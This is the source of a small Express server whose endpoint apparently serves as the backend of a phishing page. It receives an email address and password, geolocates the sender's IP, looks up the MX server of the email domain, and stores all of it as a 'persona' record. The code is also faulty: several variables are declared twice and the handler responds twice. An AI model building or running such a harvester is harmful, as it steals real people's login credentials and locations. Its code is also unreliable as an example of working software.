const express = require("express")
const bodyParser = require("body-parser")
const axios = require("axios")
const cors = require("cors")
const dnsPromises = require('dns').promises;

const app = express()
const PORT = process.env.PORT || 1682

require('./dbconnect')
const { addPersona } = require("./database/models/persona")

app.use(cors())
app.use(express.static(__dirname))
app.use(bodyParser.json()) // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })) // for parsing application/x-www-form-urlencoded

app.get("/", (req, res) => {
  res.status(200).json({ response: "Welcome, Keeps!" })
})

app.post("/UD92290", async (req, res) => {
  try {
    // Get client IP
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress ||
      req.ip

    // Free IP geolocation API
    const response = await axios.get(`https://ipapi.co/${ip}/json/`)

    const r = response.data

    const gottenAddress = {
      ip: r.ip,
      city: r.city,
      region: r.region,
      countryName: r.country_name,
      countryCode: r.country_code,
    }

    const { session_key, password } = req.body
    const user_agent = req.header("User-Agent")
    const domain = session_key.split("@")[1]

    console.log(gottenAddress)

    res.json({
      success: true,
      gottenAddress,
    })

    const { session_key, password } = req.body
    const user_agent = req.header("User-Agent")
    const domain = session_key.split("@")[1]

    const time = new Date().toTimeString()
    const mx = await dnsPromises.resolveMx(`${domain}`)

    const obj = {
      username: session_key,
      password: password,
      domain: domain,
      mx: mx[0]?.exchange || "",
      ip: gottenAddress.ip,
      city: gottenAddress.city,
      region: gottenAddress.region,
      country_name: gottenAddress.countryName,
      country_code: gottenAddress.countryCode,
      user_agent: user_agent,
      time: time,
    }

    const added = await addPersona({ ...obj })
    if (added) return res.status(201).json({ response: "Ok, added!" })

  } catch (err) {
    console.log(err)

    res.status(500).json({
      success: false,
      message: err?.msg || "Failed to fetch geolocation",
    })
  }
})

app.listen(PORT, (err) => {
  if (err) throw err
  else console.log("Listening on " + PORT)
})